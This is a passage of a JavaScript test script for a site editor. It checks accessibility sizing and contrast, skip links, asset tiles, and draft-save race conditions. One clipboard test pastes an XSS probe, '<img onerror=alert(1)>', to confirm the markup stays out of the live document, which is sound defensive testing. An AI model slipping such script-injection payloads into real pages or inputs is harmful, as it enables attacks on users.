            clipboardData: {
              getData: (kind) => (kind === "text/html" ? markup : ""),
            },
          });
          record(
            "clipboard html stays outside the editor document",
            liveParses.length === 0 &&
              created === 1 &&
              inserted.length === 2 &&
              inserted[0] === "<img onerror=alert(1)>" &&
              inserted[1] === "one\ntwo" &&
              !inserted[1].includes("alert") &&
              !inserted[1].includes("color:red"),
            `parses=${liveParses.length} docs=${created} inserted=${JSON.stringify(inserted)}`,
          );
        } catch (e) {
          record(
            "clipboard html stays outside the editor document",
            false,
            e.message,
          );
        } finally {
          impl.createHTMLDocument = originalCreate;
          if (desc) {
            Object.defineProperty(
              dom.window.Element.prototype,
              "innerHTML",
              desc,
            );
          }
        }
      }
    }
  }

  // Corner grips used to be 10px squares. The visible mark stays 10px;
  // the button itself is the hit target and must stay at least 24px.
  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const handleRule =
      stylesCss.match(/\.resize-handle\s*\{([^}]+)\}/)?.[1] ?? "";
    const width = Number(handleRule.match(/\bwidth:\s*(\d+)px/)?.[1]);
    const height = Number(handleRule.match(/\bheight:\s*(\d+)px/)?.[1]);
    const labels = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "editorResize.ts"),
      "utf8",
    );
    record(
      "resize handles meet the 24px target size",
      width >= 24 &&
        height >= 24 &&
        labels.includes("Resize from the top left") &&
        labels.includes("Resize from the bottom right") &&
        !labels.includes("Resize ${corner}"),
      `width=${width} height=${height}`,
    );
  }

  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const checkboxRules = [
      ...stylesCss.matchAll(/[^{}]*checkbox[^{]*\{([^}]+)\}/g),
    ].map((match) => match[1] ?? "");
    const sized = checkboxRules.map((rule) => ({
      width: Number(rule.match(/\bwidth:\s*(\d+)px/)?.[1]),
      height: Number(rule.match(/\bheight:\s*(\d+)px/)?.[1]),
      auto: /\bwidth:\s*auto\b/.test(rule),
    }));
    const undersized = sized.some(
      (rule) =>
        rule.auto ||
        (Number.isFinite(rule.width) && rule.width < 24) ||
        (Number.isFinite(rule.height) && rule.height < 24),
    );
    const meetsTarget = sized.some(
      (rule) => rule.width >= 24 && rule.height >= 24,
    );
    const baseRule =
      /(?:^|\n)input\[type="checkbox"\]\s*\{[^}]*width:\s*24px[^}]*height:\s*24px/.test(
        stylesCss,
      );
    record(
      "checkboxes meet the 24px target size",
      checkboxRules.length >= 4 && baseRule && meetsTarget && !undersized,
      `rules=${checkboxRules.length} sized=${JSON.stringify(sized)}`,
    );
  }

  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const buttonRules = [
      ...stylesCss.matchAll(/([^{}]*\.(?:mini-btn|btn)[^{]*)\{([^}]+)\}/g),
    ];
    const undersized = [];
    for (const match of buttonRules) {
      const selector = match[1] ?? "";
      if (/\bsvg\b/.test(selector)) continue;
      const body = match[2] ?? "";
      const sizes = [
        ...body.matchAll(/\b(?:min-)?(?:width|height):\s*(\d+)px/g),
      ].map((size) => Number(size[1]));
      for (const size of sizes) {
        if (size < 24) undersized.push(`${selector.trim()}:${size}`);
      }
    }
    const mini = stylesCss.match(/\.mini-btn\s*\{([^}]+)\}/)?.[1] ?? "";
    const baseBtn = stylesCss.match(/(?:^|\n)\.btn\s*\{([^}]+)\}/)?.[1] ?? "";
    record(
      "toolbar buttons meet the 24px target size",
      /min-width:\s*24px/.test(mini) &&
        /min-height:\s*24px/.test(mini) &&
        /min-height:\s*24px/.test(baseBtn) &&
        undersized.length === 0,
      `undersized=${undersized.join("; ")}`,
    );
  }

  // The branch chip used 2px of vertical padding on 12px text, about 20px
  // tall. Property group headers were a 10px label with 2px of padding.
  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const ruleBody = (selector) => {
      const escaped = selector.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      return (
        stylesCss.match(new RegExp(`${escaped}\\s*\\{([^}]+)\\}`))?.[1] ?? ""
      );
    };
    const minHeight = (body) =>
      Number(body.match(/\bmin-height:\s*(\d+)px/)?.[1]);
    const chip = minHeight(ruleBody(".git-branch-chip"));
    const header = minHeight(ruleBody("#view-editor .prop-group-header"));
    const git = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "GitPanel.tsx"),
      "utf8",
    );
    const groups = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "SectionProperties.tsx"),
      "utf8",
    );
    record(
      "branch chip and property headers meet the 24px target size",
      chip >= 24 &&
        header >= 24 &&
        /type="button"[\s\S]{0,80}class="git-branch-chip"/.test(git) &&
        /class="prop-group-header"[\s\S]{0,80}role="button"/.test(groups),
      `chip=${chip} header=${header}`,
    );
  }

  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const ruleBody = (selector) => {
      const escaped = selector.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const match = stylesCss.match(new RegExp(`${escaped}\\s*\\{([^}]+)\\}`));
      return match?.[1] ?? "";
    };
    const minHeight = (body) =>
      Number(body.match(/\bmin-height:\s*(\d+)px/)?.[1]);
    const layer = ruleBody(".layers-list .layer-button");
    const nav = ruleBody(".list li .nav-entry");
    const navRow =
      stylesCss.match(
        /#view-editor \.list li:has\(> \.nav-entry\),\s*#view-editor \.list\.layers-list > li\s*\{([^}]+)\}/,
      )?.[1] ?? "";
    const insert = ruleBody(".palette li .palette-insert-btn");
    const insertRow = ruleBody(
      "#view-editor .palette li:has(.palette-insert-btn)",
    );
    const page = ruleBody(".page-main");
    const pageRow = ruleBody(".page-item");
    record(
      "list rows use the whole row as the hit target",
      minHeight(layer) >= 24 &&
        /padding:\s*4px 8px/.test(layer) &&
        /width:\s*100%/.test(layer) &&
        minHeight(nav) >= 24 &&
        /padding:\s*9px 10px/.test(nav) &&
        /padding:\s*0\s*;/.test(navRow) &&
        minHeight(insert) >= 24 &&
        /padding:\s*10px 12px/.test(insert) &&
        /padding:\s*0 8px 0 0/.test(insertRow) &&
        minHeight(page) >= 24 &&
        /margin:\s*-6px 0 -6px -8px/.test(page) &&
        /padding:\s*6px 8px !important/.test(pageRow),
      `layer=${minHeight(layer)} nav=${minHeight(nav)} insert=${minHeight(insert)} page=${minHeight(page)}`,
    );
  }

  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const ruleBody = (selector) => {
      const escaped = selector.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const match = stylesCss.match(new RegExp(`${escaped}\\s*\\{([^}]+)\\}`));
      return match?.[1] ?? "";
    };
    const px = (body, prop) =>
      Number(body.match(new RegExp(`(?:^|[^\\w-])${prop}:\\s*(\\d+)px`))?.[1]);
    const rail = ruleBody(".canvas-insert");
    const button = ruleBody(".canvas-insert-button");
    const railMin = px(rail, "min-height");
    const buttonHeight = px(button, "height");
    const buttonMin = px(button, "min-height");
    record(
      "canvas insert controls meet the 24px target size",
      railMin >= 24 &&
        buttonMin >= 24 &&
        buttonHeight >= 24 &&
        buttonHeight <= railMin,
      `rail=${railMin} button=${buttonHeight}/${buttonMin}`,
    );
  }

  {
    const indexHtml = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "index.html"),
      "utf8",
    );
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const devLog =
      indexHtml.match(/<pre[\s\S]*?id="dev-log"[\s\S]*?>/)?.[0] ?? "";
    const scrollFocus = (file) => {
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", file),
        "utf8",
      );
      return /class="licenses-table-wrap"[\s\S]{0,180}tabindex="0"[\s\S]{0,180}aria-label="Third-party licenses"/.test(
        source,
      );
    };
    record(
      "scrollable logs and license lists are keyboard reachable",
      /tabindex="0"/.test(devLog) &&
        /aria-label="Dev server log"/.test(devLog) &&
        scrollFocus("MiscModals.tsx") &&
        scrollFocus("AboutLicenses.tsx") &&
        /\.dev-log:focus-visible,\s*\.licenses-table-wrap:focus-visible\s*\{[^}]*outline-offset:\s*-2px/.test(
          stylesCss,
        ),
      `log=${devLog.replace(/\s+/g, " ").slice(0, 120)}`,
    );
  }

  {
    try {
      const log = compileRendererHelper("src/renderer/editorLog.ts");
      const el = dom.window.document.createElement("pre");
      let scrollTop = 0;
      Object.defineProperty(el, "scrollTop", {
        configurable: true,
        get: () => scrollTop,
        set: (value) => {
          scrollTop = Number(value);
        },
      });
      Object.defineProperty(el, "scrollHeight", {
        configurable: true,
        get: () => 500,
      });
      Object.defineProperty(el, "clientHeight", {
        configurable: true,
        get: () => 140,
      });
      log.appendCappedLog(el, "earlier\n");
      const stayed = scrollTop === 0;
      scrollTop = 500 - 140;
      log.appendCappedLog(el, "latest\n");
      const followed = scrollTop === 500;
      record(
        "dev log stays put when the reader has scrolled up",
        stayed && followed && el.textContent === "earlier\nlatest\n",
        `scroll=${scrollTop} text=${JSON.stringify(el.textContent)}`,
      );
    } catch (e) {
      record(
        "dev log stays put when the reader has scrolled up",
        false,
        e.message,
      );
    }
  }

  // 20. Text-safe palette tokens meet WCAG 2.1 AA (4.5:1) on every surface.
  {
    const stylesCss = fs.readFileSync(
      path.join(ROOT, "src", "renderer", "styles.css"),
      "utf8",
    );
    const blockTokens = (blockRe) => {
      const block = stylesCss.match(blockRe)?.[0] ?? "";
      const tokens = {};
      const declRe = /--([a-z0-9-]+)\s*:\s*([^;]+);/g;
      let decl;
      while ((decl = declRe.exec(block))) tokens[decl[1]] = decl[2].trim();
      return tokens;
    };
    const hexToRgb = (value) => {
      const m = /^#([0-9a-f]{6})$/i.exec(value ?? "");
      if (!m) return null;
      const n = parseInt(m[1], 16);
      return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
    };
    const luminance = (rgb) => {
      const channel = (v) => {
        const c = v / 255;
        return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
      };
      return (
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2])
      );
    };
    const contrast = (fg, bg) => {
      const a = luminance(fg);
      const b = luminance(bg);
      return (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
    };
    const themes = [
      ["dark", /:root\s*\{[\s\S]*?\}/],
      ["light", /\[data-theme="light"\]\s*\{[\s\S]*?\}/],
      [
        "system-light",
        /@media \(prefers-color-scheme: light\)\s*\{\s*\[data-theme="system"\]\s*\{[\s\S]*?\}/,
      ],
    ];
    const textTokens = [
      "accent-text",
      "accent-2-text",
      "danger-text",
      "warning-text",
    ];
    const surfaces = [
      "bg",
      "bg-app",
      "bg-alt",
      "panel",
      "panel-card",
      "chrome-0",
      "chrome-2",
      "chrome-3",
    ];
    const failures = [];
    let lowest = { ratio: Infinity, detail: "" };
    for (const [themeName, blockRe] of themes) {
      const tokens = blockTokens(blockRe);
      for (const token of textTokens) {
        const fg = hexToRgb(tokens[token]);
        if (!fg) {
          failures.push(`${themeName} --${token} missing`);
          continue;
        }
        for (const surface of surfaces) {
          const bg = hexToRgb(tokens[surface]);
          if (!bg) {
            failures.push(`${themeName} --${surface} missing`);
            continue;
          }
          const ratio = contrast(fg, bg);
          if (ratio < lowest.ratio) {
            lowest = {
              ratio,
              detail: `${themeName} --${token} on --${surface}`,
            };
          }
          if (ratio < 4.5) {
            failures.push(
              `${themeName} --${token} on --${surface} ${ratio.toFixed(2)}:1`,
            );
          }
        }
      }
    }
    const dangerRule =
      stylesCss.match(
        /#view-editor \.prop-actions \.btn\.danger\s*\{([^}]+)\}/,
      )?.[1] ?? "";
    const dangerHex = dangerRule.match(/color:\s*(#[0-9a-fA-F]{6})/)?.[1];
    let dangerContrastOk = /color:\s*var\(--danger-text\)/.test(dangerRule);
    if (dangerHex) {
      const fg = hexToRgb(dangerHex);
      const lightBg = hexToRgb("#ffffff");
      const darkBg = hexToRgb("#161a26");
      dangerContrastOk =
        !!fg &&
        !!lightBg &&
        !!darkBg &&
        contrast(fg, lightBg) >= 4.5 &&
        contrast(fg, darkBg) >= 4.5;
    }
    if (!dangerContrastOk) {
      failures.push(
        `property danger button ${dangerHex ?? (dangerRule.trim() || "missing")}`,
      );
    }
    record(
      "wcag text token contrast",
      failures.length === 0,
      failures.length === 0
        ? `min ${lowest.ratio.toFixed(2)}:1 (${lowest.detail})`
        : failures.slice(0, 4).join("; "),
    );

    const solidFailures = [];
    const themeBlocks = [
      ["dark", /:root\s*\{([^}]+)\}/],
      ["light", /\[data-theme="light"\]\s*\{([^}]+)\}/],
      ["system", /\[data-theme="system"\]\s*\{([^}]+)\}/],
    ];
    const white = hexToRgb("#ffffff");
    for (const [themeName, blockRe] of themeBlocks) {
      const tokens = blockTokens(blockRe);
      for (const token of ["accent-solid", "accent-solid-hover"]) {
        const fg = white;
        const bg = hexToRgb(tokens[token]);
        if (!fg || !bg) {
          solidFailures.push(`${themeName} --${token} missing`);
          continue;
        }
        const ratio = contrast(fg, bg);
        if (ratio < 4.5) {
          solidFailures.push(`${themeName} --${token} ${ratio.toFixed(2)}:1`);
        }
      }
    }
    const primaryRule =
      stylesCss.match(/\.btn\.primary\s*\{([^}]+)\}/)?.[1] ?? "";
    const primaryHover =
      stylesCss.match(/\.btn\.primary:hover\s*\{([^}]+)\}/)?.[1] ?? "";
    const saveRule =
      stylesCss.match(
        /#view-editor \.topbar-right #btn-save\s*\{([^}]+)\}/,
      )?.[1] ?? "";
    const saveHover =
      stylesCss.match(
        /#view-editor \.topbar-right #btn-save:hover\s*\{([^}]+)\}/,
      )?.[1] ?? "";
    const logoGradients = [
      ...stylesCss.matchAll(
        /linear-gradient\(135deg,\s*var\(--accent\),\s*(var\(--accent-hover\))\)/g,
      ),
    ].map((match) => (match[1] ?? "").trim());
    const primaryUsesSolid =
      /background:\s*var\(--accent-solid\)/.test(primaryRule) &&
      /color:\s*#ffffff/.test(primaryRule) &&
      /background:\s*var\(--accent-solid-hover\)/.test(primaryHover);
    const saveUsesSolid =
      /var\(--accent-solid\)/.test(saveRule) &&
      /var\(--accent-solid-hover\)/.test(saveRule) &&
      /color:\s*#ffffff/.test(saveRule) &&
      /background:\s*var\(--accent-solid-hover\)/.test(saveHover) &&
      /color:\s*#ffffff/.test(saveHover);
    const logosStayDark =
      logoGradients.length >= 2 &&
      logoGradients.every((stop) => stop === "var(--accent-hover)");
    record(
      "primary button text meets 4.5:1",
      solidFailures.length === 0 &&
        primaryUsesSolid &&
        saveUsesSolid &&
        logosStayDark,
      solidFailures.length === 0
        ? `logos=${logoGradients.join(",")}`
        : solidFailures.join("; "),
    );

    const iconFailures = [];
    const checkIconColor = (name, colorDecl, themeList) => {
      const token = /^var\(--([a-z0-9-]+)\)$/.exec(colorDecl)?.[1] ?? "";
      const literal = hexToRgb(colorDecl);
      if (!token && !literal) {
        iconFailures.push(`${name} color ${colorDecl || "missing"}`);
        return;
      }
      for (const [themeName, blockRe] of themeList) {
        const tokens = blockTokens(blockRe);
        const fg = token ? hexToRgb(tokens[token]) : literal;
        for (const surface of ["panel", "panel-card"]) {
          const bg = hexToRgb(tokens[surface]);
          if (!fg || !bg) {
            iconFailures.push(`${name} ${themeName} unresolved`);
            continue;
          }
          const ratio = contrast(fg, bg);
          if (ratio < 4.5) {
            iconFailures.push(
              `${name} ${themeName} on --${surface} ${ratio.toFixed(2)}:1`,
            );
          }
        }
      }
    };
    const iconRules = [
      [
        ".welcome-icon-pill",
        /(?:^|\n)\.welcome-icon-pill\s*\{([^}]+)\}/,
        themes,
      ],
      [
        ".theme-card-icon-pill",
        /(?:^|\n)\.theme-card-icon-pill\s*\{([^}]+)\}/,
        themes,
      ],
      [
        ".theme-card-icon-pill light",
        /\[data-theme="light"\] \.theme-card-icon-pill\s*\{([^}]+)\}/,
        themes.filter(([themeName]) => themeName === "light"),
      ],
      [
        ".theme-card-icon-pill system",
        /\[data-theme="system"\] \.theme-card-icon-pill\s*\{([^}]+)\}/,
        themes.filter(([themeName]) => themeName === "system-light"),
      ],
    ];
    for (const [name, ruleRe, themeList] of iconRules) {
      const body = stylesCss.match(ruleRe)?.[1] ?? "";
      const colorDecl = body.match(/color:\s*([^;]+)/)?.[1]?.trim() ?? "";
      checkIconColor(name, colorDecl, themeList);
    }
    record(
      "empty-state icons stay readable on both themes",
      iconFailures.length === 0,
      iconFailures.length === 0
        ? "welcome and theme icons >= 4.5:1"
        : iconFailures.slice(0, 4).join("; "),
    );
  }

  {
    let called = 0;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const assetDom = new JSDOM(
        "<!doctype html><html><body><div id='assets'></div></body></html>",
      );
      const built = await esbuild.build({
        entryPoints: [
          path.join(ROOT, "src", "renderer", "AssetBrowserModal.tsx"),
        ],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        plugins: [solidPlugin()],
      });
      const assetMod = { exports: {} };
      vm.runInNewContext(
        built.outputFiles[0].text,
        {
          module: assetMod,
          exports: assetMod.exports,
          require,
          console,
          window: assetDom.window,
          document: assetDom.window.document,
          HTMLElement: assetDom.window.HTMLElement,
          Element: assetDom.window.Element,
          Node: assetDom.window.Node,
          requestAnimationFrame: (cb) => {
            cb(0);
            return 0;
          },
          queueMicrotask: (cb) => cb(),
          setTimeout: (cb) => {
            cb();
            return 0;
          },
        },
        { timeout: 5000 },
      );
      const host = assetDom.window.document.getElementById("assets");
      assetMod.exports.renderAssetBrowserModalBody(host, {
        assets: [
          {
            category: "documents",
            fileName: "notes.pdf",
            size: 12,
            webPath: "/assets/documents/notes.pdf",
          },
          {
            category: "images",
            fileName: "hero.png",
            previewSrc: "data:image/gif;base64,R0lGODlhAQABAAAAACw=",
            size: 40,
            webPath: "/assets/images/hero.png",
          },
        ],
        dragActive: false,
        emptyMessage: "empty",
        onDragActiveChange: () => {},
        onDropFiles: () => {},
        onSelect: () => {},
        onRendered: () => {
          called += 1;
        },
      });
      record(
        "asset browser notifies when its icons can be drawn",
        called === 1 && host.textContent.includes("notes.pdf"),
        `called=${called} text=${(host.textContent || "").trim()}`,
      );
      const preview = host.querySelector("img");
      const icon = host.querySelector("[data-lucide]");
      const tile = preview?.closest("button");
      record(
        "asset tiles name the file once",
        preview?.getAttribute("alt") === "" &&
          icon?.getAttribute("aria-hidden") === "true" &&
          (tile?.textContent ?? "").includes("hero.png") &&
          host.textContent.includes("notes.pdf"),
        `alt=${preview?.getAttribute("alt") ?? "missing"} icon=${icon?.getAttribute("aria-hidden") ?? "missing"}`,
      );
    } catch (e) {
      record(
        "asset browser notifies when its icons can be drawn",
        false,
        e.message,
      );
    }
  }

  {
    const skipHost = dom.window.document;
    const previousSkipHtml = skipHost.body.innerHTML;
    try {
      const skip = compileRendererHelper("src/renderer/editorSkipLink.ts");
      skipHost.body.innerHTML =
        '<section id="view-editor"><a class="skip-link" href="#canvas">Skip to canvas</a></section>';
      skip.syncEditorSkipLink(skipHost, "code");
      const skipLink = skipHost.querySelector(".skip-link");
      skip.syncEditorSkipLink(skipHost, "visual");
      const restored =
        skipLink?.getAttribute("href") === "#canvas" &&
        skipLink.textContent === "Skip to canvas";
      skip.syncEditorSkipLink(skipHost, "code");
      const indexHtml = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "index.html"),
        "utf8",
      );
      const codeEditorTag =
        indexHtml.match(/<div\s+id="code-editor"[\s\S]*?>/)?.[0] ?? "";
      record(
        "skip link follows the visible editor",
        skipLink?.getAttribute("href") === "#code-editor" &&
          skipLink.textContent === "Skip to code" &&
          restored &&
          /tabindex="-1"/.test(codeEditorTag) &&
          /aria-label="Code editor"/.test(codeEditorTag),
        `href=${skipLink?.getAttribute("href") ?? "missing"} text=${skipLink?.textContent ?? ""}`,
      );
    } catch (e) {
      record("skip link follows the visible editor", false, e.message);
    } finally {
      skipHost.body.innerHTML = previousSkipHtml;
    }
  }

  {
    try {
      const draft = compileRendererHelper("src/renderer/editorDraft.ts");
      const session = compileRendererHelper("src/renderer/editorSession.ts");
      const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
      const state = session.createEditorSession();
      state.project = { path: "/proj", name: "P" };
      state.page = "index.astro";
      state.pageDirty = true;
      state.pageRevision = 3;
      const cleared = [];
      let releaseWrite = () => {};
      draft.scheduleEditorDraftWrite(state, {
        writeDraft: () =>
          new Promise((resolve) => {
            releaseWrite = () => resolve({ ok: true });
          }),
        clearDraft: async (projectPath, scope, target) => {
          cleared.push([projectPath, scope, target]);
          return { ok: true };
        },
        pageDraftContent: () => "edited",
        siteDraftContent: () => "",
      });
      await wait(draft.DRAFT_WRITE_DEBOUNCE_MS + 40);
      releaseWrite();
      await wait(20);
      const keptWhileDirty = cleared.length === 0;
      cleared.length = 0;
      state.pageDirty = true;
      draft.scheduleEditorDraftWrite(state, {
        writeDraft: () =>
          new Promise((resolve) => {
            releaseWrite = () => resolve({ ok: true });
          }),
        clearDraft: async (projectPath, scope, target) => {
          cleared.push([projectPath, scope, target]);
          return { ok: true };
        },
        pageDraftContent: () => "edited",
        siteDraftContent: () => "",
      });
      await wait(draft.DRAFT_WRITE_DEBOUNCE_MS + 40);
      state.pageDirty = false;
      releaseWrite();
      await wait(20);
      record(
        "late draft write does not restore a discard",
        keptWhileDirty &&
          cleared.length === 1 &&
          cleared[0][0] === "/proj" &&
          cleared[0][1] === "page" &&
          cleared[0][2] === "index.astro",
        JSON.stringify(cleared),
      );
    } catch (e) {
      record("late draft write does not restore a discard", false, e.message);
    }
  }

  {
    try {
      const draft = compileRendererHelper("src/renderer/editorDraft.ts");
      const session = compileRendererHelper("src/renderer/editorSession.ts");
      const state = session.createEditorSession();
      state.project = { path: "/proj", name: "P" };
      state.page = "index.astro";
      state.pageDirty = true;
      state.pageRevision = 4;
      const cleared = [];
      let releaseWrite = () => {};
      const content = "newer than the save";
      const settled = draft.settlePageDraftWrite(
        state,
        {
          writeDraft: () =>
            new Promise((resolve) => {
              releaseWrite = () => resolve({ ok: true });
            }),
          clearDraft: async (projectPath, scope, target) => {
            cleared.push([projectPath, scope, target]);
            return { ok: true };
          },
          pageDraftContent: () => content,
          siteDraftContent: () => "",
        },
        "/proj",
        "index.astro",
        state.pageRevision,
        content,
      );
      state.pageDirty = false;
      releaseWrite();
      await settled;
      const saveSource = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorSave.ts"),
        "utf8",
      );
      record(
        "save's newer-edit draft does not survive a discard",
        cleared.length === 1 &&
          cleared[0][0] === "/proj" &&
          cleared[0][1] === "page" &&
          cleared[0][2] === "index.astro" &&
          saveSource.includes("settlePageDraftWrite(") &&
          !saveSource.includes("void writeDraft("),
        JSON.stringify(cleared),
      );
    } catch (e) {
      record(
        "save's newer-edit draft does not survive a discard",
        false,
        e.message,
      );
    }
  }

  {
    try {
      const draft = compileRendererHelper("src/renderer/editorDraft.ts");
      const session = compileRendererHelper("src/renderer/editorSession.ts");
      const state = session.createEditorSession();
      state.project = { path: "/proj", name: "P" };
      state.page = "team.astro";
      state.pageDirty = true;
      state.pageRevision = 2;
      const cleared = [];
      let releaseWrite = () => {};
      const content = "renamed page draft";
      const settled = draft.settlePageDraftWrite(
        state,
        {
          writeDraft: () =>
            new Promise((resolve) => {
              releaseWrite = () => resolve({ ok: true });
            }),
          clearDraft: async (projectPath, scope, target) => {
            cleared.push([projectPath, scope, target]);
            return { ok: true };
          },
          pageDraftContent: () => content,
          siteDraftContent: () => "",
        },
        "/proj",
        "team.astro",
        state.pageRevision,
        content,
      );
      state.pageDirty = false;
      releaseWrite();
      await settled;
      const modalSource = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorPageModals.ts"),
        "utf8",
      );
      const settleCalls = modalSource.match(/settleRenamedPageDraft\(/g) ?? [];
      record(
        "rename recovery draft does not survive a discard",
        cleared.length === 1 &&
          cleared[0][0] === "/proj" &&
          cleared[0][1] === "page" &&
          cleared[0][2] === "team.astro" &&
          settleCalls.length >= 3 &&
          modalSource.includes("settlePageDraftWrite(") &&
          !modalSource.includes("window.zephus.writeDraft("),
        JSON.stringify({ cleared, settleCalls: settleCalls.length }),
      );
    } catch (e) {
      record(
        "rename recovery draft does not survive a discard",
        false,
        e.message,
      );
    }
  }

  {
    try {
      const session = compileRendererHelper("src/renderer/editorSession.ts");
      const saveLib = compileRendererHelper("src/renderer/editorSave.ts");
      const state = session.createEditorSession();
      state.project = {
        path: "/proj",
        name: "P",
        astro: { pagesDir: "src/pages" },
      };
      state.page = "index.astro";
      state.pageDirty = true;
      state.siteDirty = true;
      state.siteDocument = { design: { accent: "#123456" } };
      state.pageDocument = { sections: [] };
      state.mode = "visual";
      let pageContent = "<h1>v1</h1>";
      const writes = [];
      let releaseDraft = () => {};
      let draftStarted = () => {};
      const draftStartedPromise = new Promise((resolve) => {
        draftStarted = resolve;
      });
      const sitePayload = '{"accent":"#123456"}';
      const pending = saveLib
        .createEditorSaveActions({
          getState: () => state,
          setStatus: () => undefined,
          getCode: () => pageContent,
          setCode: () => undefined,
          serializeBlocks: () => pageContent,
          pageDocumentFromState: () => state.pageDocument,
          syncVisualModeState: () => undefined,
          sectionsFromPageDocument: () => [],
          syncBlocksFromSections: () => undefined,
          clearChanges: () => undefined,
          markDirty: (dirty) => {
            if (dirty) state.pageRevision += 1;
            state.pageDirty = dirty;
          },
          scheduleDraftWrite: () => undefined,
          siteDraftContent: () => sitePayload,
          renderDirtyIndicators: () => undefined,
          reloadPages: async () => undefined,
          persistPendingSiteDocument: async () => true,
          afterSave: () => undefined,
          zephus: {
            writePageDocument: async () => {
              pageContent = "<h1>v2</h1>";
              state.pageRevision += 1;
              return {
                ok: true,
                pageDocument: { managedFileStatus: "managed" },
                source: pageContent,
                generatedSource: pageContent,
              };
            },
            detachPageDocument: async () => ({ ok: true }),
            clearDraft: async () => ({ ok: true }),
            writeDraft: (projectPath, scope, target, content) => {
              writes.push([projectPath, scope, target, content]);
              const pageWrites = writes.filter((entry) => entry[1] === "page");
              if (scope === "page" && pageWrites.length === 1) {
                return new Promise((resolve) => {
                  releaseDraft = () => resolve({ ok: true });
                  draftStarted();
                });
              }
              return Promise.resolve({ ok: true });
            },
          },
        })
        .performSave();
      await draftStartedPromise;
      pageContent = "<h1>v3</h1>";
      state.pageRevision += 1;
      releaseDraft();
      await pending;
      await new Promise((resolve) => setTimeout(resolve, 900));
      const siteWrites = writes.filter((entry) => entry[1] === "site");
      const saveSource = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorSave.ts"),
        "utf8",
      );
      record(
        "save reschedule keeps the site recovery draft",
        siteWrites.length >= 1 &&
          siteWrites.every((entry) => entry[3] === sitePayload) &&
          !saveSource.includes('siteDraftContent: () => ""'),
        JSON.stringify(writes),
      );
    } catch (e) {
      record("save reschedule keeps the site recovery draft", false, e.message);
    }
  }

  {
    try {
      const session = compileRendererHelper("src/renderer/editorSession.ts");
      const undoLib = compileRendererHelper("src/renderer/editorUndo.ts");
      const undoOps = compileRendererHelper("src/renderer/editorUndoOps.ts");
      const state = session.createEditorSession();
      const savedSections = [
        {
          id: "s1",
          type: "section",
          label: "S",
          props: {},
          children: [{ id: "b1", type: "heading", props: { text: "v1" } }],
        },
      ];
      state.project = { path: "/proj", name: "P" };
      state.page = "index.astro";
      state.sections = savedSections;
      const saved = undoLib.captureEditorSnapshot(state);
      state.sections = [
        {
          id: "s1",
          type: "section",
          label: "S",
          props: {},
          children: [{ id: "b1", type: "heading", props: { text: "v2" } }],
        },
      ];
      state.rawCode = JSON.stringify(savedSections);
      state.pageDirty = true;
      undoLib.pushEditorSnapshot(state, saved);
      const cleared = [];
      let discarded = false;
      let releaseClear = () => {};
      let releaseWrite = () => {};
      let pageClears = 0;
      dom.window.zephus = {
        clearDraft: (projectPath, scope, target) => {
          if (scope === "page") {
            pageClears += 1;
            if (pageClears === 1) {
              return new Promise((resolve) => {
                releaseClear = () => {
                  cleared.push([projectPath, scope, target, discarded]);
                  resolve({ ok: true });
                };
              });
            }
          }
          cleared.push([projectPath, scope, target, discarded]);
          return Promise.resolve({ ok: true });
        },
        writeDraft: () =>
          new Promise((resolve) => {
            releaseWrite = () => resolve({ ok: true });
          }),
      };
      undoOps
        .createUndoOps({
          getState: () => state,
          isLatchActive: () => false,
          restoreSnapshot: (snap) => {
            state.sections = snap.sections;
          },
          syncSelectionAfterRestore: () => {},
          serializeBlocks: () => JSON.stringify(state.sections),
          savedPageRendererSource: () => state.rawCode,
          trackChange: () => {},
          markDirty: (dirty) => {
            state.pageDirty = dirty;
          },
          renderLayers: () => {},
          renderCanvas: () => {},
          renderProperties: () => {},
          updateUndoRedoButtons: () => {},
        })
        .doUndo();
      state.pageDirty = true;
      state.pageRevision += 1;
      state.sections = [
        {
          id: "s1",
          type: "section",
          label: "S",
          props: {},
          children: [{ id: "b1", type: "heading", props: { text: "v3" } }],
        },
      ];
      releaseClear();
      await Promise.resolve();
      state.pageDirty = false;
      discarded = true;
      releaseWrite();
      await Promise.resolve();
      await Promise.resolve();
      const undoSource = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "editorUndoOps.ts"),
        "utf8",
      );
      record(
        "undo draft rewrite does not survive a discard",
        cleared.some(
          (entry) =>
            entry[0] === "/proj" &&
            entry[1] === "page" &&
            entry[2] === "index.astro" &&
            entry[3] === true,
        ) &&
          undoSource.includes("settlePageDraftWrite(") &&
          undoSource.includes("settleSiteDraftWrite("),
        JSON.stringify(cleared),
      );
    } catch (e) {
      record("undo draft rewrite does not survive a discard", false, e.message);
    } finally {
      delete dom.window.zephus;
    }
  }

  {
    let keyboard;
    try {
